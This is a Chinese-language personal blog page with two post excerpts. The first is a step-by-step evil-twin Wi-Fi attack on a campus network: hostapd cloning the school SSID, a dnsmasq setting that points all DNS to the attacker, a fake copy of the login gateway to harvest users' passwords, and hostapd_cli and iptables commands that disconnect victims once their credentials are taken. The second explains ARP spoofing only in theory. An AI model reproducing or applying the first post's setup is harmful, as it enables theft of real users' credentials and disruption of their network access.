<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>NULLNE</title>
	<meta name="description" content="">
	<meta name="author" content="nullne">

	<!-- HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
		<script src="/theme/js/html5.js"></script>
	<![endif]-->

    <script src="/theme/js/jquery-2.1.1.min.js"></script>
    <script src="/theme/js/bootstrap.min.js"></script>

	<!-- Styles -->
    <link rel="shortcut icon" href="/theme/img/icons/fav.ico" >

	<link href="/theme/css/bootstrap.min.css" rel="stylesheet">
	<link href="/theme/css/local.css" rel="stylesheet">
	<link href="/theme/css/pygments.css" rel="stylesheet">
    <link href="/theme/tipuesearch/tipuesearch.css" rel="stylesheet" >

	<!-- Feeds -->
	<link href="/all-atom.xml" type="application/atom+xml" rel="alternate" title="NULLNE Atom Feed" />




<script>var _gaq=[['_setAccount','UA-56583262-1'],['_trackPageview']];(function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];g.src='//www.google-analytics.com/ga.js';s.parentNode.insertBefore(g,s)}(document,'script'))</script>
</head>
<body>

    <div class="navbar navbar-fixed-top navbar-inverse">
        <div class="navbar-inner">
            <div class="container">

                <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
                <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                    <span class="icon-bar">nice</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </a>

                <!-- Be sure to leave the brand out there if you want it shown -->
                <a class="brand" href="/">NULLNE</a>

                <!-- Everything you want hidden at 940px or less, place within here -->
                <div class="nav-collapse collapse">

                <ul class="nav">

                        <li><a href="/about.html">About</a></li>
                </ul>
                    <!-- .nav, .navbar-search, .navbar-form, etc -->
                    <form class="navbar-search pull-right" id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
                        <input type="text" name="q" class="search-query" placeholder="Search">
                    </form>
                </div>

            </div>
        </div>
    </div>

    <div class="wrapper">

    <div class="container content-wrapper">
        <div class="content fixed-head-top">
            <!--
            <div class="page-header">
                <h1>NULLNE <small>Web</small></h1>
            </div>
            -->

<div class='article'>
	<h2><a class="more" href="/web/2014/real-attack-show-wifi-vulnerability.html">WIFI 热点欺骗</a></h2>
	<div class=""><p><em>很久以前看过一篇关于WIFI脆弱性的<a href="http://fex.baidu.com/blog/2014/04/traffic-hijack/">介绍</a>(找了好久终于被我找到了)，其中有一部分讲的是由于本身协议的弱点，相同 ssid 的热点会被合并为同一个，至于用户最终连接哪个热点取决于他所能接收到的信号强度。不知道此刻各位看官脑洞有没有大开？</em>
<em>俗话说杀生不如宰熟，所以直接就向学校 ap 下手了。提前声明几个全局变量：</em></p>
<div class="highlight"><pre><span class="n">ssid</span><span class="o">:</span> <span class="n">NICESHOT</span>
<span class="n">os</span><span class="err">：</span> <span class="n">ubuntu</span>
</pre></div>


<h3>简单部署</h3>
<h4>用 hostapd 建立热点</h4>
<blockquote>
<p>“<strong>hostapd</strong> is a user space daemon for access point and authentication servers. “</p>
</blockquote>
<div class="highlight"><pre>sudo apt-get install hostapd
</pre></div>


<p>更改配置文件 <em>/etc/hostapd-hotspot.conf</em> 如下：</p>
<div class="highlight"><pre># WiFi Hotspot
interface=wlan0
driver=nl80211
#Access Point
ssid=NICESHOT
hw_mode=g
# WiFi Channel:
channel=1
#macaddr_acl=0
auth_algs=1
wmm_enabled=0
#ignore_broadcast_ssid=0
#wpa=3
#wpa_passphrase=1
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=TKIP
#rsn_pairwise=CCMP
ctrl_interface=/var/run/hostapd
</pre></div>


<p>可能还需要更改 <em>/etc/default/hostapd</em> 为</p>
<div class="highlight"><pre>DAEMON_CONF=/etc/hostapd/hostapd.conf
</pre></div>


<p>然后测试配置文件<code>hostapd -d /etc/hostapd-hotspot.conf</code>,  没有什么问题的话就可以启动服务了</p>
<div class="highlight"><pre>service hostapd start
</pre></div>


<h4>微型 DNCP &amp; DNS -- dnsmasq</h4>
<blockquote>
<p>Dnsmasq is a free software DNS forwarder and DHCP server for small networks. It is considered to be easily configured, with low system resource usage.</p>
</blockquote>
<div class="highlight"><pre>sudo apt-get install dnsmasq
</pre></div>


<p>更改配置文件 <em>/etc/dnsmasq.conf</em></p>
<div class="highlight"><pre>log-facility=/var/log/dnsmasq.log
address=/#/192.168.1.1
interface=wlan0                                                                             
dhcp-range=192.168.1.20,192.168.1.254,12h
no-resolv 
</pre></div>


<p>然后比较关键的是配置 <strong>wlan0</strong> IP 地址 <code>ifconfig wlan0 192.168.1.1</code>。
稍微总结一下，到此为止，我们做了这么些事情：创建 WFIFI 热点，监听 <strong>wlan0</strong> 口，然后通过配置DHCP给所有连接到此 AP 的终端分配IP地址。另外上面的这条配置<code>address=/#/192.168.1.1</code>，将所有地址解析到我们的电脑 IP。</p>
<h4>搭建服务器</h4>
<p>此处就不详说了，最终达到的效果是访问 <code>192.168.1.1</code>是我们的钓鱼网站。
因为校园网需要登陆，也就是说连接校园 AP 之后将所有 HTTP 页面跳转到网关登陆界面。所以我们也部署一个一模一样的登陆网关，然后所有连接的用户跟往常一样登陆网关，神不知鬼不觉得就把账号密码泄露过来了。稍后我会分享此处的简单代码 DEMO 到 GitHub。</p>
<h3>进阶</h3>
<p>当然不能停止在这么简陋的东西上面，我们需要更进一步。</p>
<h4>粗暴的强制下线</h4>
<p>毕竟我们只有一个无线网卡，用作 AP 之后就不能接入其他网络了，环境也不允许拉一根网线，用户登录网关之后根本没办法继续上网，很快你的伪 AP 就会被发现。所以我们强制所有登录网关，也就是被我们窃取密码的用户离线。</p>
<div class="highlight"><pre>hostapd_cli deauthenticate 38:bc:1a:88:12:61                                                     
iptables -A INPUT -m mac --mac-source 38:bc:1a:88:12:61 -j DROP
</pre></div>


<p>第一句强制用户离线，之前在配置 hostapd 的时，这句就是为了达到这个目的 <code>ctrl_interface=/var/run/hostapd</code>，第二句将所有该设备的请求丢弃。这就是当一个人丧失所有利用价值之后的下场！</p>
<h4>配置更为合理的 iptables（还没有实现）</h4>
<p>当然，前提是我们自己的电脑还可以通过其他口，比如 <em>eth0</em>，访问正常网络。
通过配置合理强大的 <strong>iptables</strong>,精心布局，我们不仅仅获取网关密码这么简单的并且还需要特别严格苛刻的场景的蛋糕。拭目以待。。。</p>
<h3>思考</h3>
<h3>后记</h3>
<h4>伤敌一百，自损三千</h4>
<p>因为自己的装备跟技术很挫，在配置之前那些东西的时候碰到了一些问题，险些出师未捷身先死。
在 ubuntu 下，<code>service networking restart</code>,然后你就各种问题爽翻天
- 现在，至少目前为止插上网线之后还需要 <code>ifup eth0</code> 才能通过有线上网
- 现在，至少目前为止我连接 WIFI 的时候需要这么做（运气好的话差不多能连接上）</p>
<div class="highlight"><pre>ifup wlan0   #up the wlan port 
iwlist wlan0 scan #list availabel wifi ssid
iwconfig wlan0 essid &quot;NICESHOT&quot;  #no password
iwconfig wlan0 ssid &quot;NICESHOT&quot; key password   #with password
dhcpclient wlan0   #get ip via dhcp 
</pre></div>


<ul>
<li>电脑里面出现了奇怪的端口:wlan0:avahi</li>
<li>系统自带的 network-manager 罢工了</li>
<li>其他未知错误待续</li>
</ul> <a class="btn btn-primary pull-right" href="/web/2014/real-attack-show-wifi-vulnerability.html">More…</a>
	</div>
</div>	
<div class='article'>
	<h2><a class="more" href="/web/2011/ARP-protocol.html">ARP protocol analysis</a></h2>
	<div class=""><h1>ARP 协议分析</h1>
<p>@[arp|wireshark]</p>
<p><strong>地址解析协议</strong>，即<strong>ARP</strong>（Address Resolution Protocol） 是根据IP地址获取物理地址的一个TCP/IP协议。</p>
<ul>
<li><strong>工作过程</strong></li>
<li><strong>协议实战分析</strong></li>
<li><strong>安全威胁分析</strong></li>
</ul>
<hr />
<h3>工作流程</h3>
<p>主机A的IP地址为192.168.1.1，MAC地址为0A-11-22-33-44-01；
主机B的IP地址为192.168.1.2，MAC地址为0A-11-22-33-44-02；
当主机A要与主机B通信时，地址解析协议可以将主机B的IP地址（192.168.1.2）解析成主机B的MAC地址，以下为工作流程：
1. 根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。
2. 如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。
3. 主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。
4. 主机B将包含其MAC地址的ARP回复消息直接发送回主机A。
5. 当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了</p>
<h3>协议实战分析</h3>
<blockquote>
<p>测试环境：windows
测试工具: cmd, wireshark</p>
</blockquote>
<ol>
<li>在<code>cmd</code>中获取网关ip：10.3.17.1 <img alt="Alt text" src="./QQ图片20141028221016.png" /></li>
<li>配置<code>wireshap</code>截取来自网关，即10.3.17.1的arp包，设置如下<img alt="Alt text" src="./QQ图片20141028222301.png" />
获取到arp包后停止，见下图<img alt="Alt text" src="./QQ图片20141028222312.jpg" /></li>
<li>随机选择一个arp包（最后一个）进行分析<img alt="Alt text" src="./QQ图片20141028222528.png" /></li>
<li>arp包明确定义了Hardware type,Protocol type,Hardware size,Protocol size,Sender Mac  and IP address,Target Mac and IP address(从上面翻译后的内容可以清晰的看到)。</li>
<li>ARP缓存会持续一段时间（一般为2分钟），之后又进行新一轮的更新。</li>
</ol>
<h3>安全威胁分析</h3>
<p>（因为模拟ARP攻击可能导致局域网内部出错，故此处只做理论分析）</p>
<h4>ARP欺骗</h4>
<p>ARP请求为广播形式发送的，网络上的主机可以自主发送ARP应答消息，并且当其他主机收到应答报文时不会检测该报文的真实性就将其记录在本地的MAC地址转换表，这样攻击者就可以向目标主机发送伪ARP应答报文，从而篡改本地的MAC地址表。 ARP欺骗可以导致目标计算机与网关通信失败，更会导致通信重定向，所有的数据都会通过攻击者的机器。
        最简单的攻击方式就是发送固定格式的ARP报文，类似于下面的格式：<img alt="Alt text" src="./QQ图片20141028224008.png" />
已知被攻击者的ip以及mac地址（如果不知道可直接使用广播地址<code>FF.FF.FF.FF</code>），将其自己的mac地址以及想截获的目标地址IP封装好发送，即能够刷新被欺骗主机的ARP缓存，从而得到本该发往另一个IP的所有包</p>
<h4>ARP cache poisoning</h4> <a class="btn btn-primary pull-right" href="/web/2011/ARP-protocol.html">More…</a>
	</div>
</div>	


        </div>
        <div class="push"></div>
    </div><!--container-fluid-->


    <footer class="">
        <div class="container">
            <div class="row">
               <div class="span3">
                    <h3>Site</h3>
                    <ul class="unstyled">
                        <li><a href="/tags.html"><i class="icon-tags"></i>&nbsp;Tags</a></li>
                        <li><a href="/archives.html"><i class="icon-list-alt"></i>&nbsp;Archives</a></li>
                        <li><a href="/all-atom.xml"><i class="icon-star-empty"></i>&nbsp;RSS</a></li>
                    </ul>
                </div>
                <div class="span3">
                    <h3>Category</h3>
                    <ul>
                        <li><a href="/category/web.html">Web</a></li>
                        <li><a href="/category/suo-sui.html">琐碎</a></li>
                    </ul>
                </div>
                <div class="span3">
                    <h3>Blogroll</h3>
                    <ul class="unstyled">
                        <li><a href="http://zonca.github.io/"><i class="icon-user"></i>&nbsp;Zonca</a></li>
                        <li><a href="http://moparx.com/"><i class="icon-user"></i>&nbsp;Moparx</a></li>
                        <li><a href="http://blog.friparia.com/"><i class="icon-user"></i>&nbsp;Friparia</a></li>
                    </ul>
                </div>
                <div class="social span3">
                    <h3>Social</h3>
                    <ul class="unstyled">
                        <li><a href="https://github.com/nullne">Github</a></li>
                        <li><a href="https://www.linkedin.com/pub/le-yu/89/980/1a5">LinkedIn</a></li>
                        <li><a href="http://www.douban.com/people/nullnes/">豆瓣</a></li>
                        <li><a href="http://weibo.com/nullne">微博</a></li>
                    </ul>
                </div>
            </div>
        </div>
        <p class="copyleft">&copy; nullne 2013-2014</p>
    </footer>
    </div><!--wrapper-->
</body>
</html>